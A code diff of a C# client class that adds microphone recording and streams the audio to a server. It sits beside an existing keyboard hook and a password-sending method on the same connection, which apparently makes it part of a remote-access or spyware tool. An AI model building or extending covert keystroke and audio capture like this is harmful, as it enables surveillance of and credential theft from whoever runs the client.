@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Net;
 using System.Net.Sockets;
 using System.Reflection.Emit;
 using System.Runtime.InteropServices;
@@ -20,7 +21,11 @@ namespace Client
         private BinaryReader reader;
         private BinaryWriter writer;
         private int port;
-        
+
+        private VoiceIn voiceIn;
+        private VoiceOut voiceOut;
+
+       
         private string ipServer;
         private HookKeyBoard hook;
        
@@ -30,7 +35,7 @@ namespace Client
         {
             this.ipServer = ipServer;
             this.port = port;
-           
+            InitVoice();
         }
 
         public void Connect()
@@ -42,7 +47,26 @@ namespace Client
             writer = new BinaryWriter(stream);
 
             hook = HookKeyBoard.getInstance(stream, writer);
-            
+        }
+
+        private void InitVoice()
+        {
+
+            voiceIn = new VoiceIn(ipServer, 6969);
+            voiceOut = new VoiceOut(voiceIn.GetWaveFormat(),6969);
+
+        }
+
+        public void ReceiveVoice()
+        {
+            while (true)
+            {
+                voiceOut.ReceiveData();
+            }
+        }
+        public void SendVoice()
+        {
+            voiceIn.StartRecording();
         }
         public bool SendPass(string pass)
         {
